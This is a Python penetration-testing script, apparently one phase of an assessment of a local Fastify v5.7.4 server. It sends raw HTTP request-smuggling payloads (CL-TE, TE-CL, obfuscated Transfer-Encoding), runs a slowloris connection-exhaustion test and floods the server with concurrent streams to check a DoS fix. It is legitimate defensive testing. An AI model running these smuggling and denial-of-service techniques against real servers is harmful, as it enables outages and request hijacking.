#!/usr/bin/env python3
"""
Phase 5: Protocol, Streaming & DoS Attacks
Target: Fastify v5.7.4 @ http://127.0.0.1:3000
"""

import json, time, sys, os, socket, threading, struct
os.environ['PYTHONUNBUFFERED'] = '1'
import requests

BASE = 'http://127.0.0.1:3000'
EVIDENCE = {
    'phase': 5, 'title': 'Protocol, Streaming & DoS Attacks',
    'target': 'Fastify v5.7.4',
    'timestamp': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
    'tests': [], 'findings': [], 'anomalies': [],
}
test_count = anomaly_count = 0

def log(msg): print(f"[*] {msg}", flush=True)
def log_ok(msg): print(f"[+] {msg}", flush=True)
def log_warn(msg): print(f"[!] {msg}", flush=True)
def log_finding(msg): print(f"[!!!] FINDING: {msg}", flush=True)

def add_test(name, cat, result, details=None):
    global test_count; test_count += 1
    entry = {'id': test_count, 'name': name, 'category': cat, 'result': result}
    if details: entry['details'] = details
    EVIDENCE['tests'].append(entry)

def add_anomaly(name, details):
    global anomaly_count; anomaly_count += 1
    EVIDENCE['anomalies'].append({'id': anomaly_count, 'name': name, 'details': details})


# ==============================================================
# SECTION 1: HTTP Request Smuggling
# ==============================================================
def test_smuggling():
    log("=" * 60)
    log("SECTION 1: HTTP Request Smuggling")
    log("=" * 60)

    smuggling_tests = [
        # CL-TE
        ("CL-TE basic", (
            "POST /api/echo HTTP/1.1\r\n"
            "Host: 127.0.0.1:3000\r\n"
            "Content-Type: application/json\r\n"
            "Content-Length: 30\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
            "0\r\n\r\n"
            'GET /health HTTP/1.1\r\nHost: 127.0.0.1:3000\r\n\r\n'
        )),
        # TE-CL
        ("TE-CL basic", (
            "POST /api/echo HTTP/1.1\r\n"
            "Host: 127.0.0.1:3000\r\n"
            "Content-Type: application/json\r\n"
            "Transfer-Encoding: chunked\r\n"
            "Content-Length: 4\r\n"
            "\r\n"
            "1e\r\n"
            '{"smuggled": true}\r\n'
            "0\r\n\r\n"
        )),
        # Double Transfer-Encoding
        ("Double TE", (
            "POST /api/echo HTTP/1.1\r\n"
            "Host: 127.0.0.1:3000\r\n"
            "Content-Type: application/json\r\n"
            "Transfer-Encoding: chunked\r\n"
            "Transfer-Encoding: identity\r\n"
            "Content-Length: 2\r\n"
            "\r\n"
            "{}"
        )),
        # TE with obfuscation
        ("TE obfuscated", (
            "POST /api/echo HTTP/1.1\r\n"
            "Host: 127.0.0.1:3000\r\n"
            "Content-Type: application/json\r\n"
            "Transfer-Encoding : chunked\r\n"  # Space before colon
            "Content-Length: 2\r\n"
            "\r\n"
            "{}"
        )),
    ]

    for desc, raw in smuggling_tests:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect(('127.0.0.1', 3000))
            s.sendall(raw.encode())
            resp = b''
            while True:
                try:
                    chunk = s.recv(4096)
                    if not chunk: break
                    resp += chunk
                except socket.timeout: break
            s.close()
            status_line = resp.split(b'\r\n')[0].decode('utf-8', errors='replace')
            log(f"  {desc}: {status_line}")
            if b'200 OK' in resp and b'smuggled' in resp:
                log_finding(f"  Smuggling attack may have succeeded!")
            add_test(f'Smuggle-{desc}', 'smuggling', status_line)
        except Exception as e:
            log(f"  {desc}: ERROR - {e}")
            add_test(f'Smuggle-{desc}', 'smuggling', 'error')


# ==============================================================
# SECTION 2: Slowloris / Connection Exhaustion
# ==============================================================
def test_slowloris():
    log("")
    log("=" * 60)
    log("SECTION 2: Slowloris / Connection Exhaustion")
    log("=" * 60)

    # Test: Hold connections open with slow headers
    log("  Opening 50 slow connections...")
    sockets = []
    for i in range(50):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect(('127.0.0.1', 3000))
            s.sendall(f"GET /health HTTP/1.1\r\nHost: 127.0.0.1:3000\r\nX-Slow-{i}: ".encode())
            sockets.append(s)
        except:
            break

    log(f"  Opened {len(sockets)} connections")

    # Check if server still responds
    time.sleep(1)
    try:
        resp = requests.get(f'{BASE}/health', timeout=5)
        log(f"  Server still responsive: status={resp.status_code}")
        add_test('Slowloris-50conn', 'dos', 'server-responsive')
    except:
        log_finding("Server unresponsive during slowloris!")
        add_test('Slowloris-50conn', 'dos', 'server-unresponsive')

    # Clean up
    for s in sockets:
        try: s.close()
        except: pass

    # Verify recovery
    time.sleep(2)
    try:
        resp2 = requests.get(f'{BASE}/health', timeout=5)
        log(f"  Post-cleanup: status={resp2.status_code}")
        log_ok("  Server recovered after closing slow connections")
    except:
        log_warn("  Server still unresponsive after cleanup!")


# ==============================================================
# SECTION 3: Body Limit Testing
# ==============================================================
def test_body_limits():
    log("")
    log("=" * 60)
    log("SECTION 3: Body Size Limits")
    log("=" * 60)

    # Test various body sizes
    sizes = [
        (1024, "1KB"),
        (65536, "64KB"),
        (524288, "512KB"),
        (1048576, "1MB (at limit)"),
        (1048577, "1MB+1 (over limit)"),
        (2097152, "2MB"),
    ]

    for size, desc in sizes:
        try:
            data = json.dumps({"data": "A" * (size - 20)})
            resp = requests.post(f'{BASE}/api/echo',
                               data=data,
                               headers={'Content-Type': 'application/json'},
                               timeout=10)
            log(f"  {desc}: status={resp.status_code}")
            if resp.status_code == 413:
                log_ok(f"    Correctly rejected as too large")
            elif resp.status_code == 400:
                log(f"    Bad request (may be parse error)")
        except Exception as e:
            log(f"  {desc}: ERROR - {e}")
        add_test(f'BodyLimit-{desc}', 'dos', str(resp.status_code) if 'resp' in dir() else 'error')


# ==============================================================
# SECTION 4: WebStream Backpressure (CVE-2026-25224)
# ==============================================================
def test_webstream():
    log("")
    log("=" * 60)
    log("SECTION 4: WebStream Backpressure (CVE-2026-25224)")
    log("=" * 60)

    # CVE-2026-25224: DoS via unbounded memory in sendWebStream
    # Fixed in 5.7.3 - verify patch

    log("  Testing ReadableStream with controlled parameters...")
    # Normal request
    resp = requests.get(f'{BASE}/stream/web?chunks=10&chunkSize=1024', timeout=10)
    log(f"  Normal stream (10x1K): status={resp.status_code}, length={len(resp.content)}")
    add_test('WebStream-normal', 'protocol', str(resp.status_code))

    # Large chunks
    resp2 = requests.get(f'{BASE}/stream/web?chunks=100&chunkSize=65536', timeout=15)
    log(f"  Large stream (100x64K): status={resp2.status_code}, length={len(resp2.content)}")
    add_test('WebStream-large', 'protocol', str(resp2.status_code))

    # Memory check before and after
    mem_before = requests.get(f'{BASE}/health').json()['memory']['rss']

    # Multiple concurrent stream requests
    log("  Launching 10 concurrent large streams...")
    threads = []
    results = []
    def stream_request():
        try:
            r = requests.get(f'{BASE}/stream/web?chunks=200&chunkSize=32768', timeout=30)
            results.append(('ok', len(r.content)))
        except Exception as e:
            results.append(('error', str(e)))

    for _ in range(10):
        t = threading.Thread(target=stream_request)
        threads.append(t)
        t.start()

    for t in threads:
        t.join(timeout=35)

    mem_after = requests.get(f'{BASE}/health').json()['memory']['rss']
    mem_diff = (mem_after - mem_before) / (1024 * 1024)
    log(f"  Memory: before={mem_before/(1024*1024):.1f}MB, after={mem_after/(1024*1024):.1f}MB, diff={mem_diff:.1f}MB")
    log(f"  Results: {len([r for r in results if r[0] == 'ok'])} ok, {len([r for r in results if r[0] == 'error'])} errors")

    if mem_diff > 100:
        log_warn(f"  Significant memory growth ({mem_diff:.1f}MB) during stream test!")
        add_anomaly('webstream-memory-growth', {'diff_mb': round(mem_diff, 1)})
    else:
        log_ok(f"  Memory growth reasonable ({mem_diff:.1f}MB)")
    add_test('WebStream-concurrent', 'protocol', f'{mem_diff:.1f}MB growth')


# ==============================================================
# SECTION 5: SSE Event Stream
# ==============================================================
def test_sse():
    log("")
    log("=" * 60)
    log("SECTION 5: SSE Event Stream")
    log("=" * 60)

    # Test: SSE with abort
    log("  Testing SSE with early client disconnect...")
    try:
        resp = requests.get(f'{BASE}/stream?count=1000&delay=100', timeout=3, stream=True)
        chunks_received = 0
        for chunk in resp.iter_content(chunk_size=128):
            chunks_received += 1
            if chunks_received > 5:
                break
        resp.close()
        log(f"  Received {chunks_received} chunks before disconnect")
        add_test('SSE-early-disconnect', 'protocol', 'ok')
    except requests.exceptions.ReadTimeout:
        log("  Timed out (expected)")
        add_test('SSE-early-disconnect', 'protocol', 'timeout')
    except Exception as e:
        log(f"  Error: {e}")

    # Verify server is still ok
    time.sleep(1)
    resp2 = requests.get(f'{BASE}/health', timeout=5)
    log(f"  Server health after SSE abort: {resp2.status_code}")


# ==============================================================
# SECTION 6: Hook Timeout DoS
# ==============================================================
def test_hook_timeout():
    log("")
    log("=" * 60)
    log("SECTION 6: Hook Timeout / Connection Holding")
    log("=" * 60)

    # The server doesn't have a never-resolving hook, but we can test
    # the connectionTimeout behavior
    log("  Testing connectionTimeout (30s configured)...")
    log("  Sending request with no body (holding connection)...")

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(35)
        s.connect(('127.0.0.1', 3000))
        s.sendall(b"POST /api/echo HTTP/1.1\r\nHost: 127.0.0.1:3000\r\nContent-Type: application/json\r\nContent-Length: 1000\r\n\r\n")
        # Send partial body
        s.sendall(b'{"partial": true')
        # Wait for timeout
        t0 = time.time()
        try:
            resp = s.recv(4096)
            elapsed = time.time() - t0
            log(f"  Server closed connection after {elapsed:.1f}s")
            if elapsed > 25:
                log_ok(f"  connectionTimeout working (closed at ~{elapsed:.0f}s)")
            else:
                log(f"  Connection closed early at {elapsed:.1f}s")
        except socket.timeout:
            log("  Socket timed out at 35s (connectionTimeout may be disabled)")
        s.close()
    except Exception as e:
        log(f"  Error: {e}")
    add_test('Hook-timeout', 'dos', 'tested')


# ==============================================================
# SECTION 7: Request ID Collision
# ==============================================================
def test_request_ids():
    log("")
    log("=" * 60)
    log("SECTION 7: Request ID Uniqueness")
    log("=" * 60)

    ids = set()
    for i in range(100):
        resp = requests.get(f'{BASE}/health')
        req_id = resp.headers.get('X-Request-Id', '')
        if req_id in ids:
            log_warn(f"  Duplicate request ID at iteration {i}: {req_id}")
            add_anomaly('request-id-collision', {'id': req_id, 'iteration': i})
            break
        ids.add(req_id)

    log(f"  {len(ids)} unique request IDs in 100 requests")
    if len(ids) == 100:
        log_ok("  All request IDs unique (crypto.randomUUID)")
    add_test('RequestID-uniqueness', 'protocol', f'{len(ids)}/100 unique')


# ==============================================================
# MAIN
# ==============================================================
def main():
    log(f"Phase 5 Attack Script - Fastify v5.7.4")
    log(f"Started: {time.strftime('%Y-%m-%d %H:%M:%S')}")

    try:
        r = requests.get(f'{BASE}/health', timeout=3)
        log(f"Server: Fastify {r.json()['version']}")
    except:
        log("ERROR: Server not reachable"); sys.exit(1)

    test_smuggling()
    test_slowloris()
    test_body_limits()
    test_webstream()
    test_sse()
    test_hook_timeout()
    test_request_ids()

    log(f"\nPHASE 5 COMPLETE: {test_count} tests, {len(EVIDENCE['findings'])} findings, {anomaly_count} anomalies")
    EVIDENCE.update({'total_tests': test_count, 'total_findings': len(EVIDENCE['findings']), 'total_anomalies': anomaly_count})

    with open('/home/[REDACTED]/Desktop/[REDACTED-PATH]/Fastify/evidence/phase5_protocol_dos.json', 'w') as f:
        json.dump(EVIDENCE, f, indent=2, default=str)
    log("Evidence saved.")

if __name__ == '__main__':
    main()
